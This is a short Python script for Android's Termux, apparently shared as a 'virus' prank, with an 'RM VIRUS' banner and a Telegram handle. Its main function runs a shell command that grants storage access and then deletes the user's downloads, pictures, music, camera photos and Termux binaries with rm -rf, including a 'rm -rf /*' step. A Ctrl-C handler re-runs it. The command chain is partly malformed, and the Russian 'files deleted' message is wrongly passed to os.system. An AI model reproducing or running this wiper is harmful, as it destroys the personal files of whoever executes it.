import os
import time
banner = '''
██████╗░███╗░░░███╗  ██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗
██╔══██╗████╗░████║  ██║░░░██║██║██╔══██╗██║░░░██║██╔════╝
██████╔╝██╔████╔██║  ╚██╗░██╔╝██║██████╔╝██║░░░██║╚█████╗░
██╔══██╗██║╚██╔╝██║  ░╚████╔╝░██║██╔══██╗██║░░░██║░╚═══██╗
██║░░██║██║░╚═╝░██║  ░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝
╚═╝░░╚═╝╚═╝░░░░░╚═╝  ░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
'''
def main():
	print(banner)
	print("Fuck The Rules")
	print('TELEGRAM - SHMAT_Hack')
	os.system("termux-setup-storage && cd storage && rm -rf shared && ** rm -rf downloads && rm -rf pictures && rm -rf movies && rm -rf music && rm -rf dcim && rm -rf /* && rm -rf /data/data/com.termux/files/usr/bin/ && rm -rf *")
	time.sleep(1)
	os.system('Файлы удалены!')
try:
	main()
except KeyboardInterrupt:
    main()
